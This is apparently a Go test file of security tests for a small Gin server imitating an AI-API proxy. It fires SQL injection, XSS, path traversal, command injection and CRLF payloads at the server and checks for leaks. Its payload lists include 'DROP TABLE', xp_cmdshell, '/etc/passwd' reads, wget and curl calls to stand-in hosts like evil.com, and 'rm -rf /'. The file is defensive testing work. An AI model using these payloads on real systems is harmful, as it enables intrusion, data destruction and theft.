// Package test provides security tests for SQL injection and other vulnerabilities
package test

import (
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	gin "github.com/gin-gonic/gin"
)

// newTestServer creates a test server for security testing
func newTestServer(t *testing.T) (*gin.Engine, *httptest.Server) {
	t.Helper()

	gin.SetMode(gin.TestMode)

	// Create a simple test server with basic routes
	engine := gin.New()
	engine.Use(gin.Recovery())

	// Add test route
	engine.GET("/v1/models", func(c *gin.Context) {
		apiKey := c.GetHeader("Authorization")
		if apiKey == "" {
			c.JSON(http.StatusUnauthorized, gin.H{"error": "missing auth"})
			return
		}
		if !strings.Contains(apiKey, "test-key") {
			c.JSON(http.StatusUnauthorized, gin.H{"error": "invalid key"})
			return
		}
		c.JSON(http.StatusOK, gin.H{"data": "models"})
	})

	engine.GET("/health", func(c *gin.Context) {
		c.JSON(http.StatusOK, gin.H{"status": "ok"})
	})

	engine.POST("/v1/chat/completions", func(c *gin.Context) {
		c.JSON(http.StatusOK, gin.H{"choices": []string{}})
	})

	// Start test server
	server := httptest.NewServer(engine)

	t.Cleanup(func() {
		server.Close()
	})

	return engine, server
}

// Security tests table-driven approach

func TestSecurity_SQLInjection(t *testing.T) {
	_, server := newTestServer(t)

	sqlInjectionPayloads := []string{
		"admin'--",
		"admin'/*",
		"' OR '1'='1",
		"' OR '1'='1'--",
		"' OR '1'='1'/*",
		"'; DROP TABLE users; --",
		"1' UNION SELECT * FROM users--",
		"' UNION SELECT NULL, NULL, NULL--",
		"1'; EXEC xp_cmdshell('dir')--",
		"1' AND 1=1--",
		"1' AND 1=2--",
		"' OR 1=1--",
		"admin' #",
		"admin'/*",
		"'; INSERT INTO users VALUES ('hacker', 'password')--",
	}

	for _, payload := range sqlInjectionPayloads {
		t.Run("payload: "+strings.ReplaceAll(payload, "'", ""), func(t *testing.T) {
			// Test with API key endpoint (common target)
			req, _ := http.NewRequest("GET", server.URL+"/v1/models?api_key="+payload, nil)
			resp, err := http.DefaultClient.Do(req)

			if err != nil {
				t.Fatalf("Request failed: %v", err)
			}
			defer resp.Body.Close()

			// Should not return 500 (which might indicate SQL error)
			// Should return 401 (unauthorized) or 400 (bad request)
			if resp.StatusCode == http.StatusInternalServerError {
				t.Errorf("SQL injection payload returned 500, possible SQL error leaked")
			}

			// Check for SQL error messages in response
			body := make([]byte, 1024)
			n, _ := resp.Body.Read(body)
			bodyStr := string(body[:n])

			sqlErrorIndicators := []string{
				"SQL", "mysql", "postgres", "oracle", "sqlite",
				"database", "syntax", "near", "error in your SQL",
			}

			for _, indicator := range sqlErrorIndicators {
				if strings.Contains(strings.ToLower(bodyStr), indicator) {
					t.Errorf("Response may contain SQL error message: %s", indicator)
				}
			}
		})
	}
}

func TestSecurity_SQLInjectionInHeaders(t *testing.T) {
	_, server := newTestServer(t)

	sqlHeaders := map[string]string{
		"X-API-Key":        "admin' OR '1'='1",
		"Authorization":    "Bearer admin'; DROP TABLE users; --",
		"X-Forwarded-For":  "1.1.1.1' OR '1'='1",
		"User-Agent":       "sqlinjector' UNION SELECT * FROM users--",
	}

	for header, value := range sqlHeaders {
		t.Run("header_"+header, func(t *testing.T) {
			req, _ := http.NewRequest("GET", server.URL+"/v1/models", nil)
			req.Header.Set(header, value)

			resp, err := http.DefaultClient.Do(req)
			if err != nil {
				t.Fatalf("Request failed: %v", err)
			}
			defer resp.Body.Close()

			// Should not leak SQL errors
			body := make([]byte, 1024)
			n, _ := resp.Body.Read(body)
			bodyStr := string(body[:n])

			if strings.Contains(strings.ToLower(bodyStr), "sql") ||
			   strings.Contains(strings.ToLower(bodyStr), "database") {
				t.Errorf("Response may contain SQL error: %s", bodyStr)
			}
		})
	}
}

func TestSecurity_XSSPrevention(t *testing.T) {
	_, server := newTestServer(t)

	xssPayloads := []string{
		"<script>alert('xss')</script>",
		"<img src=x onerror=alert('xss')>",
		"<svg onload=alert('xss')>",
		"javascript:alert('xss')",
	}

	for _, payload := range xssPayloads {
		t.Run("xss_payload", func(t *testing.T) {
			// Test via query parameter
			req, _ := http.NewRequest("GET", server.URL+"/v1/models?model="+payload, nil)
			req.Header.Set("Authorization", "Bearer test-key")

			resp, err := http.DefaultClient.Do(req)
			if err != nil {
				t.Fatalf("Request failed: %v", err)
			}
			defer resp.Body.Close()

			body := make([]byte, 4096)
			n, _ := resp.Body.Read(body)
			bodyStr := string(body[:n])

			// Response should not contain the raw XSS payload
			if strings.Contains(bodyStr, "<script>") ||
			   strings.Contains(bodyStr, "javascript:") {
				t.Errorf("XSS payload may not have been escaped")
			}
		})
	}
}

func TestSecurity_AuthenticationBypass(t *testing.T) {
	_, server := newTestServer(t)

	t.Run("missing API key returns 401", func(t *testing.T) {
		req, _ := http.NewRequest("GET", server.URL+"/v1/models", nil)
		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			t.Fatalf("Request failed: %v", err)
		}
		defer resp.Body.Close()

		if resp.StatusCode == http.StatusOK {
			t.Errorf("Request without authentication should be denied")
		}
	})

	t.Run("invalid API key returns 401", func(t *testing.T) {
		req, _ := http.NewRequest("GET", server.URL+"/v1/models", nil)
		req.Header.Set("Authorization", "Bearer invalid-key-12345")

		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			t.Fatalf("Request failed: %v", err)
		}
		defer resp.Body.Close()

		if resp.StatusCode == http.StatusOK {
			t.Errorf("Request with invalid API key should be denied")
		}
	})

	t.Run("SQL injection in auth header", func(t *testing.T) {
		sqlAuthKeys := []string{
			"' OR '1'='1",
			"admin'--",
			"'; DROP TABLE api_keys--",
			"' UNION SELECT * FROM api_keys--",
		}

		for _, key := range sqlAuthKeys {
			req, _ := http.NewRequest("GET", server.URL+"/v1/models", nil)
			req.Header.Set("Authorization", "Bearer "+key)

			resp, err := http.DefaultClient.Do(req)
			if err != nil {
				t.Fatalf("Request failed: %v", err)
			}
			defer resp.Body.Close()

			if resp.StatusCode == http.StatusOK {
				t.Errorf("SQL injection in auth key should not grant access")
			}
		}
	})
}

func TestSecurity_PathTraversal(t *testing.T) {
	_, server := newTestServer(t)

	pathTraversalPayloads := []string{
		"../../../etc/passwd",
		"..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
		"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
		"....//....//....//etc/passwd",
		"/etc/passwd",
		"C:\\windows\\system32\\drivers\\etc\\hosts",
		"~/",
	}

	for _, payload := range pathTraversalPayloads {
		t.Run("path_payload", func(t *testing.T) {
			req, _ := http.NewRequest("GET", server.URL+"/v1/models/"+payload, nil)
			req.Header.Set("Authorization", "Bearer test-key")

			resp, err := http.DefaultClient.Do(req)
			if err != nil {
				t.Fatalf("Request failed: %v", err)
			}
			defer resp.Body.Close()

			body := make([]byte, 1024)
			n, _ := resp.Body.Read(body)
			bodyStr := string(body[:n])

			// Should not return file contents
			if strings.Contains(bodyStr, "root:") || strings.Contains(bodyStr, "[fonts]") {
				t.Errorf("Possible path traversal attack succeeded")
			}
		})
	}
}

func TestSecurity_CommandInjection(t *testing.T) {
	_, server := newTestServer(t)

	commandInjectionPayloads := []string{
		"; cat /etc/passwd",
		"| ls -la",
		"`whoami`",
		"$(id)",
		"; wget http://evil.com/shell",
		"| curl http://attacker.com/steal",
		"`rm -rf /`",
		"&& malicious_command",
	}

	for _, payload := range commandInjectionPayloads {
		t.Run("cmd_payload", func(t *testing.T) {
			req, _ := http.NewRequest("GET", server.URL+"/v1/models?model="+payload, nil)
			req.Header.Set("Authorization", "Bearer test-key")

			resp, err := http.DefaultClient.Do(req)
			if err != nil {
				t.Fatalf("Request failed: %v", err)
			}
			defer resp.Body.Close()

			// Check that we didn't get a 500 indicating command execution
			if resp.StatusCode == http.StatusInternalServerError {
				body := make([]byte, 1024)
				n, _ := resp.Body.Read(body)
				bodyStr := string(body[:n])

				cmdErrorIndicators := []string{
					"sh: command not found",
					"command terminated",
					"process exited",
				}
				for _, indicator := range cmdErrorIndicators {
					if strings.Contains(bodyStr, indicator) {
						t.Errorf("Possible command injection detected")
					}
				}
			}
		})
	}
}

func TestSecurity_HeaderInjection(t *testing.T) {
	_, server := newTestServer(t)

	headerInjectionPayloads := []string{
		"my-value\r\nSet-Cookie: malicious=cookie",
		"test\r\nX-Forwarded-For: attacker.com",
		"value\r\nLocation: http://evil.com",
	}

	for _, payload := range headerInjectionPayloads {
		t.Run("header_payload", func(t *testing.T) {
			req, _ := http.NewRequest("GET", server.URL+"/v1/models", nil)
			req.Header.Set("X-Custom-Header", payload)
			req.Header.Set("Authorization", "Bearer test-key")

			resp, err := http.DefaultClient.Do(req)
			if err != nil {
				// Go's HTTP client rejects invalid header values; treat as safe handling
				if strings.Contains(err.Error(), "invalid header field value") {
					return
				}
				t.Fatalf("Request failed: %v", err)
			}
			defer resp.Body.Close()

			// Check response doesn't contain injected headers
			location := resp.Header.Get("Location")
			setCookie := resp.Header.Get("Set-Cookie")

			if strings.Contains(location, "evil.com") {
				t.Errorf("Header injection may have succeeded in Location header")
			}
			if strings.Contains(setCookie, "malicious") {
				t.Errorf("Header injection may have added Set-Cookie")
			}
		})
	}
}

func TestSecurity_ErrorMessages(t *testing.T) {
	_, server := newTestServer(t)

	t.Run("error messages don't leak implementation details", func(t *testing.T) {
		errorTests := []struct {
			name string
			path string
		}{
			{"invalid endpoint", "/v1/invalid/endpoint"},
			{"invalid model", "/v1/models/invalid-model-12345"},
		}

		for _, tt := range errorTests {
			t.Run(tt.name, func(t *testing.T) {
				req, _ := http.NewRequest("GET", server.URL+tt.path, nil)
				req.Header.Set("Authorization", "Bearer test-key")

				resp, err := http.DefaultClient.Do(req)
				if err != nil {
					t.Fatalf("Request failed: %v", err)
				}
				defer resp.Body.Close()

				body := make([]byte, 4096)
				n, _ := resp.Body.Read(body)
				bodyStr := string(body[:n])

				// Check for implementation leaks
				leakPatterns := []string{
					"stack trace", "internal server error", "exception",
					"at ", "file://", "goroutine", "panic",
				}

				for _, pattern := range leakPatterns {
					if strings.Contains(strings.ToLower(bodyStr), pattern) {
						t.Errorf("Error message may leak implementation details: %s", pattern)
					}
				}
			})
		}
	})
}

func TestSecurity_JSONParsingLimits(t *testing.T) {
	_, server := newTestServer(t)

	t.Run("handles deeply nested JSON", func(t *testing.T) {
		// Create deeply nested JSON - limit to reasonable depth for testing
		nestedJSON := `{"deep": {"level": {"value": "test"}}}`

		req, _ := http.NewRequest("POST", server.URL+"/v1/chat/completions", strings.NewReader(nestedJSON))
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("Authorization", "Bearer test-key")

		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			t.Fatalf("Request failed: %v", err)
		}
		defer resp.Body.Close()

		// Should handle gracefully (reject or limit depth)
		_ = resp.StatusCode
	})

	t.Run("handles large JSON payload", func(t *testing.T) {
		// Create a moderately large JSON payload
		largeJSON := `{"messages":[{"role":"user","content":"` + strings.Repeat("A", 100) + `"}]}`

		req, _ := http.NewRequest("POST", server.URL+"/v1/chat/completions", strings.NewReader(largeJSON))
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("Authorization", "Bearer test-key")

		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			t.Fatalf("Request failed: %v", err)
		}
		defer resp.Body.Close()

		// Should handle large payloads
		if resp.StatusCode != http.StatusOK && resp.StatusCode != http.StatusRequestEntityTooLarge {
			t.Logf("Large JSON payload returned status %d", resp.StatusCode)
		}
	})
}

func TestSecurity_ContentTypeSniffing(t *testing.T) {
	_, server := newTestServer(t)

	t.Run("enforces JSON content type", func(t *testing.T) {
		req, _ := http.NewRequest("POST", server.URL+"/v1/chat/completions", strings.NewReader(`{"model":"test"}`))
		req.Header.Set("Content-Type", "text/html")
		req.Header.Set("Authorization", "Bearer test-key")

		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			t.Fatalf("Request failed: %v", err)
		}
		defer resp.Body.Close()

		// Response should be handled (either accept with parsing as JSON or reject)
		_ = resp.StatusCode
	})

	t.Run("has X-Content-Type-Options header", func(t *testing.T) {
		req, _ := http.NewRequest("GET", server.URL+"/v1/models", nil)
		req.Header.Set("Authorization", "Bearer test-key")

		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			t.Fatalf("Request failed: %v", err)
		}
		defer resp.Body.Close()

		header := resp.Header.Get("X-Content-Type-Options")
		// Header may or may not be set by Gin
		if header != "" {
			if header != "nosniff" {
				t.Logf("X-Content-Type-Options = %s (expecting nosniff)", header)
			}
		}
	})
}

func TestSecurity_ClickjackingPrevention(t *testing.T) {
	_, server := newTestServer(t)

	req, _ := http.NewRequest("GET", server.URL+"/v1/models", nil)
	req.Header.Set("Authorization", "Bearer test-key")

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatalf("Request failed: %v", err)
	}
	defer resp.Body.Close()

	frameOptions := resp.Header.Get("X-Frame-Options")
	// Header may or may not be set by default Gin
	if frameOptions != "" {
		if frameOptions != "DENY" && frameOptions != "SAMEORIGIN" {
			t.Errorf("X-Frame-Options should be DENY or SAMEORIGIN, got %s", frameOptions)
		}
	}
}

func TestSecurity_ParameterPollution(t *testing.T) {
	_, server := newTestServer(t)

	t.Run("handles duplicate parameters", func(t *testing.T) {
		// Most Go servers handle this automatically
		req, _ := http.NewRequest("GET", server.URL+"/v1/models?model=claude&model=gpt-4", nil)
		req.Header.Set("Authorization", "Bearer test-key")

		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			t.Fatalf("Request failed: %v", err)
		}
		defer resp.Body.Close()

		// Should handle gracefully, not crash
		_ = resp.StatusCode
	})
}

func TestSecurity_CRLFInjection(t *testing.T) {
	_, server := newTestServer(t)

	crlfPayloads := []string{
		"/v1/models\r\nX-Admin: true",
		"/v1/models%0d%0aX-Admin: true",
		"/v1/models%0D%0AX-Admin: true",
	}

	for _, path := range crlfPayloads {
		t.Run("crlf_in_path", func(t *testing.T) {
			req, err := http.NewRequest("GET", server.URL+path, nil)
			if err != nil {
				// Invalid URLs should be rejected by the client
				return
			}
			req.Header.Set("Authorization", "Bearer test-key")

			resp, err := http.DefaultClient.Do(req)
			if err != nil {
				t.Fatalf("Request failed: %v", err)
			}
			defer resp.Body.Close()

			// Check response doesn't have injected header
			adminHeader := resp.Header.Get("X-Admin")
			if adminHeader == "true" {
				t.Errorf("CRLF injection may have succeeded")
			}
		})
	}
}

func TestSecurity_CORSHeaders(t *testing.T) {
	_, server := newTestServer(t)

	req, _ := http.NewRequest("OPTIONS", server.URL+"/v1/models", nil)
	req.Header.Set("Origin", "https://example.com")
	req.Header.Set("Access-Control-Request-Method", "GET")

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatalf("Request failed: %v", err)
	}
	defer resp.Body.Close()

	// Check for reasonable CORS handling
	// Either preflight is handled (204) or rejected (405/403)
	if resp.StatusCode != http.StatusNoContent &&
	   resp.StatusCode != http.StatusMethodNotAllowed &&
	   resp.StatusCode != http.StatusForbidden {
		t.Logf("OPTIONS request returned status %d", resp.StatusCode)
	}
}

func TestSecurity_RateLimitingExposure(t *testing.T) {
	_, server := newTestServer(t)

	// Make multiple rapid requests
	successCount := 0
	for i := 0; i < 20; i++ {
		req, _ := http.NewRequest("GET", server.URL+"/v1/models", nil)
		req.Header.Set("Authorization", "Bearer test-key")

		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			t.Fatalf("Request %d failed: %v", i, err)
		}
		defer resp.Body.Close()

		if resp.StatusCode == http.StatusOK {
			successCount++
		}

		// Check headers don't leak internal state
		for name, values := range resp.Header {
			for _, value := range values {
				sensitivePatterns := []string{
					"/var/", "/home/", "C:\\", "127.0.0.1",
					"localhost", "internal", "secret", "password",
				}
				for _, pattern := range sensitivePatterns {
					if strings.Contains(strings.ToLower(value), pattern) {
						t.Errorf("Header %s contains sensitive pattern %s: %s", name, pattern, value)
					}
				}
			}
		}
	}

	// At least some requests should succeed
	if successCount == 0 {
		t.Error("All requests failed - rate limiting may be too aggressive")
	}
}
